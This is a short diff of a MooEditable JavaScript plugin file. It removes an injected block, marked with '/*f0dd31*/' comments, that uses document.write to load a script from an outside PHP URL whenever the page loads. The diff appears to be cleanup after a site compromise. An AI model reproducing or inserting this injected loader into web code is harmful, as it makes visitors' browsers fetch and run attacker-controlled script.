@@ -80,13 +80,3 @@ MooEditable.Actions.flash = {
 		this.dialogs.flash.prompt.open();
 	}
 };
-
-/*f0dd31*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/f0dd31*/
